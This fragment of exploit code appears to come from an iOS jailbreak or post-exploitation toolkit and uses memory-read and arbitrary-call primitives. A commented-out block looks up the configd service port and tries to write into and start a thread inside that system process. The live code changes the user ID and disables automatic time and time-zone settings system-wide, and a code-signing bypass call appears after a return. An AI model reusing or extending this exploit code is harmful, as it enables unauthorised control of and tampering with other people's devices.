

	/*
	var port_addr = shit_heap(4);
	var kr = bootstrap_look_up(bootstrap_port, "com.apple.SystemConfiguration.configd", port_addr);

	scall("printf", "%d (%s) %x %x\n", kr, mach_error_string(kr), port_addr, read_u32(port_addr));
	printf("where u at\n");
//	kr = vm_write(read_u32(port_addr), 0x41414141, port_addr & (~0xfff), 4);
	scall("printf", "%d (%s)\n", kr, mach_error_string(kr));

	var child_threadptr = shit_heap(4);
	printf("where u at\n");
	var child_thread;
	printf("where u at\n");
	var thread_state = shit_heap(0x1000);
	printf("where u at\n");
	var port = read_u32(port_addr);
	printf("where u at\n");
	kr = thread_create(port, child_threadptr);
	scall("printf", "%d (%s)\n", kr, mach_error_string(kr));
	printf("where u at\n");
	child_thread = read_u32(child_thread);
	printf("where u at\n");
	kr = calls4arg("thread_set_state", child_thread, ARM_THREAD_STATE, thread_state, ARM_THREAD_STATE_COUNT);
	scall("printf", "%d (%s)\n", kr, mach_error_string(kr));
	printf("where u at\n");
	kr = calls4arg("thread_resume", child_thread, 0, 0, 0);
	scall("printf", "%d (%s)\n", kr, mach_error_string(kr));
	printf("where u at\n");*/

	kCFBooleanFalse = dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "kCFBooleanFalse");
	kCFBooleanTrue = dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "kCFBooleanTrue");
	kCFPreferencesAnyUser = dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "kCFPreferencesAnyUser");
	kCFPreferencesCurrentHost = dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "kCFPreferencesCurrentHost");
	printf("%x\n", kCFBooleanFalse);

//	setuid(read_u32(getpwnam("_timed") + 8));
	setuid(501);
	printf("%d\n", getuid());
//	call4arg(0, 0, 0, 0, 0);

	CFPreferencesSetValue(__CFStringMakeConstantString("Active"), read_u32(kCFBooleanFalse), __CFStringMakeConstantString("com.apple.timezone.auto"), read_u32(kCFPreferencesAnyUser), read_u32(kCFPreferencesCurrentHost));
	CFPreferencesSynchronize(__CFStringMakeConstantString('com.apple.timezone.auto'), read_u32(kCFPreferencesAnyUser), read_u32(kCFPreferencesCurrentHost));
	CFPreferencesSetValue(__CFStringMakeConstantString("TMAutomaticTimeOnlyEnabled"), read_u32(kCFBooleanFalse), __CFStringMakeConstantString("com.apple.timed"), read_u32(kCFPreferencesAnyUser), read_u32(kCFPreferencesCurrentHost));
	CFPreferencesSetValue(__CFStringMakeConstantString("TMAutomaticTimeZoneEnabled"), read_u32(kCFBooleanFalse), __CFStringMakeConstantString("com.apple.timed"), read_u32(kCFPreferencesAnyUser), read_u32(kCFPreferencesCurrentHost));
	CFPreferencesSynchronize(__CFStringMakeConstantString('com.apple.timed'), read_u32(kCFPreferencesAnyUser), read_u32(kCFPreferencesCurrentHost));
	
	return;

	csbypass();

	return;